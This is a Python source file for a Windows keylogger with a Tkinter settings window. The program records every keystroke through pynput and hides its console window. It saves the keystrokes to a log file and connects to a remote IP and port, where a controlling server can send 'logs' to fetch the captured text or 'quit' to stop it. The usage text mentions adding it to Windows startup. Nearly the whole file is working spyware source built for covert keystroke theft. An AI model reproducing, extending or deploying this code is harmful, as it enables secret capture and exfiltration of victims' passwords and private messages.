"""
Created by Eyal Hermoni
"""
try:
    # import keyboard
    from pynput import keyboard
except():
    print("Please install keyboard moudle\n keyboard Module: https://pypi.org/project/keyboard/")
import os
import time
import datetime
import threading
import win32event
import winerror
import win32api
import tkinter as tk
import socket
import random
from tkinter import filedialog
import base64

class KeyLogger:
    def __init__(self, settings):
        self.current_time = datetime.datetime.now()
        self.text = "%s/%s/%s %s:%s\nKeyLogger starting\n" % (
        str(self.current_time.month).zfill(2), str(self.current_time.day).zfill(2), self.current_time.year, str(self.current_time.hour).zfill(2),
        str(self.current_time.minute).zfill(2))
        self.working = True
        self.settings = settings
        self.special = {keyboard._win32.Key.insert: "[insert]",
                        keyboard._win32.Key.scroll_lock: "[scroll lock]",
                        keyboard._win32.Key.pause: "[pause]",
                        keyboard._win32.Key.home: "[home]",
                        keyboard._win32.Key.page_up: "[page up]",
                        keyboard._win32.Key.page_down: "[page down]",
                        keyboard._win32.Key.delete: "[delete]",
                        keyboard._win32.Key.end: "[end]",
                        keyboard._win32.Key.f1: "[f1]",
                        keyboard._win32.Key.f2: "[f2]",
                        keyboard._win32.Key.f3: "[f3]",
                        keyboard._win32.Key.f4: "[f4]",
                        keyboard._win32.Key.f5: "[f5]",
                        keyboard._win32.Key.f6: "[f6]",
                        keyboard._win32.Key.f7: "[f7]",
                        keyboard._win32.Key.f8: "[f8]",
                        keyboard._win32.Key.f9: "[f9]",
                        keyboard._win32.Key.f10: "[f10]",
                        keyboard._win32.Key.f11: "[f11]",
                        keyboard._win32.Key.f12: "[f12]",
                        keyboard._win32.Key.tab: "[tab]",
                        keyboard._win32.Key.caps_lock: "[caps lock]",
                        keyboard._win32.Key.shift_l: "[left shift]",
                        keyboard._win32.Key.ctrl_l: "[left ctrl]",
                        keyboard._win32.Key.alt_l: "[left alt]",
                        keyboard._win32.Key.alt_gr: "[alt gr]",
                        keyboard._win32.Key.alt_r: "[right alt]",
                        "left windows": "[left windows]",
                        keyboard._win32.Key.ctrl_r: "[right ctrl]",
                        keyboard._win32.Key.shift_r: "[right shift]",
                        keyboard._win32.Key.backspace: "[backspace]",
                        keyboard._win32.Key.menu: "[menu]",
                        keyboard._win32.Key.num_lock: "[num lock]",
                        "decimal": "[decimal]",
                        keyboard._win32.Key.left: "[left]",
                        keyboard._win32.Key.right: "[right]",
                        keyboard._win32.Key.up: "[up]",
                        keyboard._win32.Key.down: "[down]"}

        # checking for multiple instances
        self.multiple_instance()

        # hook the keyboard

        # hides the console
        #self.hide()

        threading.Thread(target=self.timer).start()
        self.my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.my_socket.connect((settings.IP, settings.Port))
        message_bytes = settings.name.encode('utf-8')
        self.my_socket.send(message_bytes)
        threading.Thread(target=self.handle_socket).start()

        with keyboard.Listener(
                on_release=self.handle_presses) as listener:
            listener.join()


    def handle_socket(self):
        while self.working:
            msg = self.my_socket.recv(1024)
            msg = msg.decode('utf-8')
            print(msg)
            if msg == 'quit':
                self.working = False
            elif msg == 'logs':
                self.save_data()
                self.my_socket.send(open(self.settings.filename, 'r').read().encode('utf-8'))
    # handle the presses
    def handle_presses(self, key):
        if (type(key) == keyboard._win32.Key):
            # if escape key is pressed it save the data and close the program.
            if key == keyboard._win32.Key.esc and s.Escape:
                self.text += '[esc]'
                self.save_data()
                self.working = False
                return False

            # if the space key is pressed it add space to the data.
            if key == keyboard._win32.Key.space:
                self.text += ' '

            # if the print screen button is pressed its save the progress.
            elif key == keyboard._win32.Key.print_screen:
                self.text += '[print screen]'
                self.save_data()

            # if enter is pressed it goes line down.
            elif key == keyboard._win32.Key.enter:
                self.text += '\n'

            elif key in self.special.keys():
                self.text += self.special[key]

            else:
                self.text += "unknown key"

        elif (type(key) == keyboard._win32.KeyCode):
            # if a normal button is pressed it just add it.
            self.text += str(key)[1]

        if self.working == False:
            return False
        # the KeyLogger save the data to a text file every 25 chars.
        """if len(self.text) > 5:
            self.save_data()
        else:
            pass"""

    def timer(self):
        time.sleep(60 - datetime.datetime.now().second)
        while self.working:
            if len(self.text)>20:
                self.save_data()
            else:
                self.text = ''
            now = datetime.datetime.now()
            timenow = "\n\n%s/%s/%s %s:%s\n\n" % (str(now.month).zfill(2), str(now.day).zfill(2), now.year, str(now.hour).zfill(2), str(now.minute).zfill(2))
            self.text += timenow
            time.sleep(60)
        win32api.MessageBox(0, 'Thank you for using my KeyLogger', 'Python keyLogger', 0x00001000)


    @staticmethod
    # checking for multiple instances and stops the program if 1 exist
    def multiple_instance():
        """
        Disallowing Multiple Instance
        """
        mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
        if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
            mutex = None
            print("Multiple Instance not Allowed")
            exit(0)

    @staticmethod
    # hides the console
    def hide():
        """
        This function hides the console
        """
        import win32console, win32gui
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)
        return True

    @staticmethod
    # show a massage to explain how to activate the code
    def msg():
        print("""\n \nKeyLoogger for windows
        By: Eyal hermoni
        usage:python Main.py mode
        mods:
        start
        [optional] startup: This will add the keylogger to windows startup.\n\n""")
        print("""\n \n python keylogger """)
        exit(0)

    def save_data(self):
        """
        This function save the data to the text file
        """
        txt = open(self.settings.filename, 'a')
        txt.write(self.text)
        txt.close()
        # print(self.text)
        self.text = ''
    # save the data to text file



class gui:
    def __init__(self, master):
        # Setting up the main window
        self.master = master
        self.master.resizable(width=False, height=False)
        self.master.title('Settings')
        self.frame = tk.Frame(master=self.master, width=600, height=400, bg='black').pack()

        # Setting up the title
        self.labelTitle = tk.Label(master=self.frame, text='PYTHON KEY LOGGER', bg='black', fg='red', font=("Times", "30", "bold italic")).place(x=300, y=50, anchor='center')

        # Setting up the button to start the program
        self.button = tk.Button(master=self.frame, text='START!', bg='black', fg='green', height=1, width=10, font=1, command=self.continu, borderwidth=0).place(x=250,y=350)

        # Setting up the directory button and label
        self.labeldirectory = tk.Label(master=self.frame, text='If its your first time using this program use this button:', bg='black', fg='white', font=1).place(x=10, y=100)
        self.directory = tk.Button(master=self.frame, text='Choose a directory for your logs', bg='white', fg='black', height=1, command=self.choose_directory, borderwidth=1).place(x=400, y=100)
        # Setting up the text file button and label
        self.labelfile = tk.Label(master=self.frame, text='If you already ran your program please choose the text file:', bg='black', fg='white', font=1).place(x=10, y=150)
        self.file = tk.Button(master=self.frame, text='Choose a file for your logs', bg='white', fg='black', height=1, command=self.choose_file, borderwidth=1).place(x=430, y=150)

        # Setting up the text that say the current file
        self.filenamelabel = tk.StringVar()
        self.label = tk.Label(master=self.frame, textvariable=self.filenamelabel).place(x=300, y=200, anchor='center')
        self.filename = os.path._getfullpathname(os.path.curdir)+'\log.txt'
        self.set_filename()

        # Setting up the checkbox that ask you if you escape button to stop the program
        self.Escape = tk.BooleanVar(value=True)
        self.checkbutton = tk.Checkbutton(self.frame, text="Escape to stop?", variable=self.Escape, bg='black', fg='white', selectcolor='black', borderwidth=0).place(y=350, x=100)

        # Setting up the information i need for the server client
        self.labelIp = tk.Label(self.frame, text='Enter IP here:', bg='black', fg='white', font=1).place(x=100, y=230)
        self.enteryIp = tk.Entry(self.frame, width=40, font=1, fg='green')
        self.enteryIp.place(x=203, y=232)
        self.enteryIp.insert(0, '127.0.0.1')

        self.labelPort = tk.Label(self.frame, text='Enter Port here:', bg='black', fg='white', font=1).place(x=100, y=270)
        self.enteryPort = tk.Entry(self.frame, width=38, font=1, fg='green')
        self.enteryPort.place(x=220, y=272)
        self.enteryPort.insert(0, '23')

        self.labelName = tk.Label(self.frame, text='Enter Name here:', bg='black', fg='white', font=1).place(x=100, y=310)
        self.enteryName = tk.Entry(self.frame, width=37, font=1, fg='green')
        self.enteryName.place(x=230, y=312)
        names = open('names.txt', 'r').read().split('\n')
        self.enteryName.insert(0, names[random.randint(0,len(names))])

        # if the user presses the exit button the program wont continue
        self.master.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.hide()

    @staticmethod
    def on_closing():
        quit()

    def choose_directory(self):
        """
        This function is using a dialog box to ask for the directory
        """
        self.filename = filedialog.askdirectory(initialdir="/", title="Select directory")
        self.filename += '/log.txt'
        self.set_filename()

    def choose_file(self):
        """
        This function is using a dialog box to ask for the text file
        """
        self.filename = filedialog.askopenfilename(initialdir="/", title="Select a text file", filetypes=(('Text files', '*.txt'), ('All files', '*.*')))
        self.set_filename()

    def set_filename(self):
        """
        This function updates the buttom label according to the current file chosen
        """
        self.filenamelabel.set('The current file location is: '+self.filename)

    def continu(self):
        self.Port = int(self.enteryPort.get())
        self.IP = self.enteryIp.get()
        self.name = self.enteryName.get()
        self.master.destroy()
        self.master.quit()

    @staticmethod
    # hides the console
    def hide():
        """
        This function hides the console
        """
        import win32console, win32gui
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)
        return True


if __name__ == '__main__':
    settings = tk.Tk()
    s = gui(settings)
    settings.mainloop()
    keylogger = KeyLogger(s)


